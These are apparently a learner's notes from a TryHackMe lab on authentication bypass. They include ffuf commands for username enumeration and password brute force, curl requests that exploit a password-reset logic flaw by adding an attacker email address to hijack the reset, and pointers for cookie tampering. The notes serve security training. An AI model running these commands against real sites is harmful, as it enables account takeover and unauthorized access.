
# Username Enumeration
The ffuf tool uses a list of commonly used usernames to check against for any matches.

    user@tryhackme$** ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.154.177/customers/signup -mr "username already exists"

# Brute Force
A brute force attack is an automated process that tries a list of commonly used passwords against either a single username or, like in our case, a list of usernames.

```shell-session
user@tryhackme$ ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.154.177/customers/login -fc 200
```
# Logic Flaw
A logic flaw is when the typical logical path of an application is either bypassed, circumvented or manipulated by a hacker. 
![image](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/58e63d7810ac4b23051e1dd4a24ef792.png)
First step is to send Curl Requests on the Terminal. Curl tool utilized to manually make the request to the webserver

In the second step of the reset email process, the username is submitted in a POST field to the web server, and the email address is sent in the query string request as a GET field.
#### curl request 1:

    curl 'http://10.10.154.177/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
#### curl request 2:
```
curl 'http://10.10.154.177/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
```
#### curl request 2 (**using your @acmeitsupport.thm account**:
    curl  'http://10.10.154.177/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={username}@customer.acmeitsupport.thm'

# Cookie Tampering
Examining and editing the cookies set by the web server during online session can have multiple outcomes, such as unauthenticated access, access to another user's account, or elevated privileges.

https://crackstation.net/ <--keep databases of billions of hashes and their original strings.
https://www.base64decode.org/ <-- Common encoding types are base32 which converts binary data to the characters A-Z and 2-7, and base64 which converts using the characters a-z, A-Z, 0-9,+, / and the equals sign for padding.
https://gchq.github.io/CyberChef/




